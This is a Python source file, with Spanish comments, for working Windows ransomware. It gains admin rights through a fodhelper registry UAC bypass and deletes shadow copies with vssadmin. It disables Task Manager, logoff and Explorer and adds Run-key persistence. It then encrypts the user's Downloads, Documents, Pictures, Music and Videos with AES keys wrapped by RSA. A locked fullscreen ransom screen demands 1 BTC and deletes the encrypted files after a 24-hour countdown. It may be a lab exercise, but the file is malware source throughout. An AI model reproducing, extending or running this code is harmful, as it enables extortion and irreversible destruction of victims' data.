import json
import os
import shutil
import sys
import ctypes
from threading import Thread
import threading
import winreg
import subprocess
import time
from pathlib import Path
from pygame import mixer
import tkinter as tk
from tkinter import messagebox, ttk
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
import sys
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

FOD_HELPER = "C:\\Windows\\System32\\fodhelper.exe"
CMD = "cmd.exe"
PYTHON_CMD = sys.executable  # Usar el intérprete Python actual
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

# Función para mostrar el popup de pago en Tkinter
def show_payment_popup(directories, sk):
    popup = tk.Toplevel()
    popup.title("Confirmar pago")
    popup.geometry("300x150")
    
    label = tk.Label(popup, text="¿Has realizado el pago de 1 BTC?", font=("Helvetica", 12))
    label.pack(pady=10)
    
    def confirm_payment(directories, sk):
        # Lógica de comunicación con el servidor Flask para confirmar el pago
        try:
            url = "http://192.168.1.140:5000/confirm_payment"

            payload = json.dumps({
                "payment_confirmed": True,
            })

            headers = {
                'Content-Type': 'application/json',
            }

            # Aquí corregimos la URL a la que el servidor espera la solicitud
            response = requests.request("POST", url, headers=headers, data=payload)

            if response.status_code == 200:
                revertirCambios(directories,sk)
                messagebox.showinfo("Éxito", "Pago confirmado, los archivos han sido desencriptados.")
            else:
                # Si la respuesta no es exitosa, mostramos un mensaje de error
                messagebox.showerror("Error", "No se pudo confirmar el pago.")
        except requests.exceptions.RequestException as e:
            # Si hay algún error en la conexión o en la solicitud
            print(f"Error al contactar el servidor: {e}")
            messagebox.showerror("Error", "Hubo un problema al contactar el servidor.")
        
        # Cerrar el popup después de la confirmación
        popup.destroy()

    # Botón de confirmación del pago
    pay_button = tk.Button(popup, text="Pagar", command=lambda: confirm_payment(directories, sk), font=("Helvetica", 12), fg="white", bg="green")
    pay_button.pack(pady=20)

    # Botón para cancelar
    cancel_button = tk.Button(popup, text="Cancelar", command=popup.destroy, font=("Helvetica", 12), fg="white", bg="red")
    cancel_button.pack()

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    

def runAsAdminFODHELPER():
    if not is_running_as_admin():
        print('[!] El script NO está corriendo con privilegios de administrador')
        print('[+] Intentando obtener privilegios elevados con FODHELPER...')
        
        try:
            # Ruta del script actual
            current_dir = sys.executable
            publicFolder = r"C:\Users\Public"

            file_name = os.path.basename(current_dir)
            target_path = os.path.join(publicFolder, file_name)

            try:
                if not os.path.exists(target_path):  # Verifica si el archivo ya existe en el destino
                    shutil.move(current_dir, target_path)
                    print(f"Archivo movido a: {target_path}")
                else:
                    print(f"El archivo ya está en la ubicación correcta: {target_path}")
            except Exception as e:
                print(f"Error al mover el archivo: {e}")

            # Comando directo sin cmd.exe
            commands = target_path  # Ejecuta directamente el archivo sin consola

            # Modifica el registro para que FODHELPER ejecute el script
            reg_path = r"Software\Classes\ms-settings\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                winreg.SetValueEx(key, None, 0, winreg.REG_SZ, commands)
                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")

            # Ejecuta FODHELPER
            os.system(FOD_HELPER)  # Usar Popen para no bloquear el script principal

            # Limpia el registro después de ejecutar FODHELPER
            time.sleep(2)  # Espera un momento para que el comando se ejecute
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.DeleteValue(key, "DelegateExecute")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)

            # Termina el proceso actual
            sys.exit(0)

        except Exception as e:
            print(f"[!] Error al intentar elevar privilegios: {e}")
            sys.exit(1)
    else:
        print('[+] El script está corriendo con privilegios de administrador!')

# Función para ejecutar los comandos principales
def stopAndDeleteNecessaryItems():
    try:
        currentExecutable = os.path.abspath(sys.executable)
        # Comandos para SO
        commands = [
            "vssadmin delete shadows /all /quiet",
            "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System "
            "/v DisableTaskMgr /t REG_DWORD /d 1 /f",
            "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System "
            "/v HideFastUserSwitching /t REG_DWORD /d 1 /f",
            "REG HKCU HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer "
            "/v NoLogoff /t REG_DWORD /d 1 /f",
            "REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System "
            "/v DisableSwitchUser /t REG_DWORD /d 1 /f",
            "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            f"/v MalwareTask /t REG_SZ /d {currentExecutable} /f",
            'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v InactivityTimeoutSecs /t REG_DWORD /d 0 /f',
            'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoExplorer /t REG_DWORD /d 1 /f',
            'taskkill /f /im explorer.exe',
        ]

        # Ejecutar cada comando
        for command in commands:
            print(f"Ejecutando: {command}")
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                print("El código se ha ejecutado.")
            # Verificar código de retorno
            if result.returncode != 0:
                print(f"[!] Error al ejecutar '{command}'. Código de retorno: {result.returncode}")
    
    except Exception as e:
        print(f"[!] Error general en la ejecución de comandos: {e}")    
    
def play_alarm():
    if hasattr(sys, '_MEIPASS'):
        sound_file = os.path.join(sys._MEIPASS, 'alarm_sound.mp3')
    else:
        sound_file = 'alarm_sound.mp3'

    mixer.init()
    try:
        mixer.music.load(sound_file)
        mixer.music.play(-1)
    except Exception as e:
        print(f"Error al reproducir el sonido: {e}")

def generatePairKeys():
    sk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pk = sk.public_key()
    return sk, pk

def encryptFile(filePath, pk):
    aesK = os.urandom(32) 
    iv = os.urandom(16)
    with open(filePath, "rb") as f:
        data = f.read()

    cipher = Cipher(algorithms.AES(aesK), modes.CBC(iv))
    encryptor = cipher.encryptor()

    padder = PKCS7(128).padder()
    data_padded = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(data_padded) + encryptor.finalize()

    encrypted_aes_key = pk.encrypt(
        aesK,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    encrypted_file_path = filePath + ".encrypted"
    with open(encrypted_file_path, "wb") as f:
        f.write(iv + encrypted_aes_key + encrypted_data)

    os.remove(filePath)

def encryptDirectory(directories, pk):
    for folder in directories:
        for root, dirs, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)
                if not file.endswith(".encrypted"):
                    encryptFile(file_path, pk)

def deleteFiles(directories):
    for folder in directories:
        for root, dirs, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith(".encrypted"):
                    os.remove(file_path)

def get_resource_path(filename):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, filename)
    else:
        return os.path.join(os.path.abspath('.'), filename)

def graphicInterface(directories, sk):
    root = tk.Tk()
    root.title("Tus archivos han sido secuestrados.")
    root.attributes('-fullscreen', True)
    root.configure(bg="black")
    root.bind("<KeyPress>", blockingHotkeys)
    disable_close_event(root)

    play_alarm()

    header = tk.Label(root, text="¡ATENCIÓN! TUS ARCHIVOS HAN SIDO SECUESTRADOS", fg="red", bg="black", font=("Helvetica", 24, "bold"))
    header.pack(pady=20)

    subtitle = tk.Label(root, text="Todos tus archivos importantes han sido secuestrados.\n" 
                                    "Para obtener acceso a ellos y que no sean eliminados permanentemente, debes seguir las instrucciones.\n" 
                                    "TIEMPO RESTANTE: ", fg="white", bg="black", font=("Helvetica", 14))
    subtitle.pack(pady=10)

    reloj = tk.Label(root, text="00:00:00", fg="red", bg="black", font=("Helvetica", 48, "bold"))
    reloj.pack(pady=20)

    instrucciones = tk.Label(root, text="Para que los archivos sean descifrados y poder recuperar el control del dispositivo, debes ingresar un pago de 1 BTC a la siguiente dirección: ", 
                              fg="white", bg="black", font=("Helvetica", 12), justify="left")
    instrucciones.pack(pady=10)

    countdownTimer(reloj, 24)

    progress = ttk.Progressbar(root, length=300, mode="determinate")
    progress.pack(pady=20)
    progress["value"] = 50

    pay_button = tk.Button(root, text="PAGAR AHORA", command=lambda: show_payment_popup(directories, sk),
                            font=("Helvetica", 14), fg="white", bg="red", width=15)
    pay_button.pack(pady=10)

    info_button = tk.Button(root, text="MÁS INFORMACIÓN", command=lambda: messagebox.showinfo("Información",
                                                                                              "Tus archivos serán eliminados si no realizas el pago."),
                             font=("Helvetica", 14), fg="black", bg="yellow", width=15)
    info_button.pack(pady=10)

    root.mainloop()


def blockingHotkeys(event):
    # Definir las teclas que deseas bloquear
    hotkeys = ['Alt', 'Control_L', 'Control_R', 'Tab', 'Escape']
    
    # Si la tecla presionada está en la lista de teclas bloqueadas
    if event.keysym in hotkeys:
        return "break"  # Impide que el evento se propague (bloquea la tecla)

# FUNCIONA

def disable_close_event(root):
    def on_close():
        pass  # No hacer nada cuando se intente cerrar la ventana

    root.protocol("WM_DELETE_WINDOW", on_close)  # Deshabilitar cerrar la ventana


# FUNCIONA
def countdownTimer(label, hours):
    timer = time.time() + hours * 3600

    # Mientras el tiempo no alcance las horas estipuladas, resta el tiempo
    def update_timer():
        nonlocal timer
        while time.time() < timer:
            tiempoRestante = int(timer - time.time())
            
            horasRestantes = tiempoRestante // 3600
            minutosRestantes = (tiempoRestante % 3600) // 60
            segundosRestantes = tiempoRestante % 60

            # Actualizamos la etiqueta con el tiempo restante
            label.config(text=f"{horasRestantes:02}:{minutosRestantes:02}:{segundosRestantes:02}")
            time.sleep(1)

        label.config(text="00:00:00")
        messagebox.showwarning("Tiempo agotado", "Tus archivos serán eliminados ahora.")
        deleteFiles([str(Path.home() / "Downloads"), str(Path.home() / "Documents")])

    Thread(target=update_timer, daemon=True).start()

def decryptFile(filePath, private_key):
    # Abrir el archivo cifrado
    with open(filePath, "rb") as f:
        iv = f.read(16)  # El IV es de 16 bytes
        encrypted_aes_key = f.read(256)  # La clave AES cifrada con RSA (típicamente 256 bytes para RSA-2048)
        encrypted_data = f.read()

    # Desencriptar la clave AES con la clave privada RSA
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Desencriptar los datos con AES (modo CBC)
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    decryptor = cipher.decryptor()

    # Eliminar el padding PKCS7
    unpadder = PKCS7(128).unpadder()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    decrypted_data = unpadder.update(decrypted_data) + unpadder.finalize()

    # Usar os.path.splitext() para obtener el nombre original
    decrypted_file_path, ext = os.path.splitext(filePath)
    decrypted_file_path = decrypted_file_path + ext.replace(".encrypted", "")  # Eliminar la extensión .encrypted

    # Guardar los datos desencriptados en el archivo original
    with open(decrypted_file_path, "wb") as f:
        f.write(decrypted_data)

    # Eliminar el archivo cifrado
    os.remove(filePath)


def decryptDirectory(directories, private_key):
    for folder in directories:
        for root, dirs, files in os.walk(folder):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith(".encrypted"):
                    decryptFile(file_path, private_key)

def revertirCambios(directories,sk):

        decryptDirectory(directories,sk)
        commands = [
            # Restaurar el acceso al Administrador de Tareas
            "REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f",
            "REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /f",
            "REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /f",
            "REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableSwitchUser /f",
            "REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MalwareTask /f",
            'REG DELETE HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoExplorer /f',
            'REG DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v InactivityTimeoutSecs /f',
            'start explorer.exe',
            "taskkill /f /im ransomware.exe",
        ]


        # Ejecutar cada comando
        for command in commands:
            print(f"Ejecutando: {command}")
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                print("El código se ha ejecutado.")
            # Verificar código de retorno
            if result.returncode != 0:
                print(f"[!] Error al ejecutar '{command}'. Código de retorno: {result.returncode}")
   
def runClient():
    app.run(host="0.0.0.0", port=5001)

def main():
    runAsAdminFODHELPER()

    # Deshabilitar administrador de tareas
    stopAndDeleteNecessaryItems()

    # Generamos las claves RSA y cargamos la clave pública
    sk, pk = generatePairKeys()

    # Seleccionamos los directorios que contienen los archivos a cifrar
    folders_path = [
        str(os.path.join(Path.home(), "Downloads")),       
        str(os.path.join(Path.home(), "Documents")),       
        str(os.path.join(Path.home(), "Pictures")),        
        str(os.path.join(Path.home(), "Music")),          
        str(os.path.join(Path.home(), "Videos")),          
    ]

    encryptDirectory(folders_path, pk)
    
    flask_thread = threading.Thread(target=runClient)
    flask_thread.daemon = True
    flask_thread.start()
    
    graphicInterface(folders_path, sk)

    
    

if __name__ == "__main__":
    main()

       
   